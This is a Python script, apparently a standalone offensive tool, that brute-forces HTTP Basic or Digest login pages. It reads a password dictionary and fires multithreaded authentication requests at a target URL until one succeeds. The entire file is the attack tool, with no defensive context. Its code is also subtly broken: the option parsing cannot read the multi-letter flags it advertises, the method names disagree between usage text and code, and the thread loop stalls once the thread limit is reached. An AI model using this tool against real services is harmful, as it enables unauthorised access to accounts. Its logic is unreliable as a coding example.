#!/usr/bin/python3

import requests
import time
import sys
import getopt
from threading import Thread
from requests.auth import HTTPDigestAuth

global hit
hit = "1"

def banner():
    print('''
            *******************************
            BASE OR DIGEST BRUTEFORCE AUTH
            *******************************''')

def usage():
    print("Usage: ")
    print("""
        -un: username
        -url: url(http://example.com)
        -f: dictionary file
        -m: method(basic, digest)
        -t: threads
        """)
    print("Example: basicdigestauth.py -url http://exampl.com -un admin -t 5 -f password.txt -m method")
    sys.exit()  # Exit the script after displaying the usage message

class RequestPerformer(Thread):
    def __init__(self, password, username, url, method):
        Thread.__init__(self)
        self.password = password.strip()
        self.username = username
        self.url = url
        self.method = method

    def run(self):
        try:
            if self.method == "base":
                # Perform base authentication request
                response = requests.get(self.url, auth=(self.username, self.password))
            elif self.method == "digest":
                # Perform digest authentication request
                response = requests.get(self.url, auth=HTTPDigestAuth(self.username, self.password))

            if response.status_code == 200:
                print("[+] Password found: " + self.password)
                global hit
                hit = "0"
        except requests.exceptions.RequestException:
            pass

def start(argv):
    banner()
    if len(argv) < 10:
        usage()
    try:
        opts, args = getopt.getopt(argv, "un:url:f:m:t:")
    except getopt.GetoptError:
        print("[!!] Error On Arguments!")
        sys.exit()

    username = None
    url = None
    dictionary_file = None
    method = None
    threads = None

    for opt, arg in opts:
        if opt == "-un":
            username = arg
        elif opt == "-url":
            url = arg
        elif opt == "-f":
            dictionary_file = arg
        elif opt == "-m":
            method = arg
        elif opt == "-t":
            threads = int(arg)

    if not (username and url and dictionary_file and method and threads):
        usage()

    try:
        with open(dictionary_file, "r") as f:
            passwords = f.readlines()
    except FileNotFoundError:
        print("[!!] File Doesn't Exist, Please Check the Path Correctly")
        sys.exit()

    launcher_thread(passwords, threads, username, url, method)

def launcher_thread(passwords, threads, username, url, method):
    i = [0]
    while len(passwords) > 0:
        if hit == "1":
            try:
                if i[0] < threads:
                    passwd = passwords.pop(0)
                    i[0] += 1
                    thread = RequestPerformer(passwd, username, url, method)
                    thread.start()
            except KeyboardInterrupt:
                print("[!!] Interrupted !!")
                sys.exit()

    thread.join()

if __name__ == "__main__":
    start(sys.argv[1:])
